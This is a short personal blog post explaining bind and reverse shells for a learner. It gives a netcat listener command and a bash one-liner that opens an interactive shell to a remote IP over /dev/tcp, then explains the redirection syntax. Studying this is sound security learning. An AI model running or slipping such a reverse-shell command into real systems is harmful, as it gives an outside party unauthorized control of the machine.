+++
date = '2026-05-09'
draft = false
title = 'reverse shells'
ShowToc = true
tags = ["Materials"]
+++


## Why

I finally ought to learn about these I think

---

For hosting stuff, check out [this post](https://irinasusca.github.io/writeup-blog/tunneling).

For a bunch of different shells, [this website](https://www.revshells.com/).

---

There are a couple different types of shells:

- **Bind shell**, where we connect to the target 

- **Reverse shell**, where the target connects to us

Normally, we, as attackers, listen with `netcat`:

```bash
nc -lvnp 1337
```

Flags are `-l` (listen), `v` (verbose), `n` (no DNS), `p` (port).

A reverse shell typically looks like this: 

```bash
sh -i >& /dev/tcp/188.18.188.188/1337 0>&1
```

Let's break this down though.

- `sh -i` means start an interactive shell

- `>&` means redirect stdout and stderr into the socket

- `0>&1` means redirect stdin wherever stdout is 

The `&` is used to represent that the next value will be a file descriptor.

And, the `>& file` in this case is a shortcut for doing this:

```bash
1> file 2>&1
```

And the reason we need to do it with an `-i` (interactive flag), is that it will make it human friendly.

This was the most confusing part, at least for me. I hope I cleared that up now.

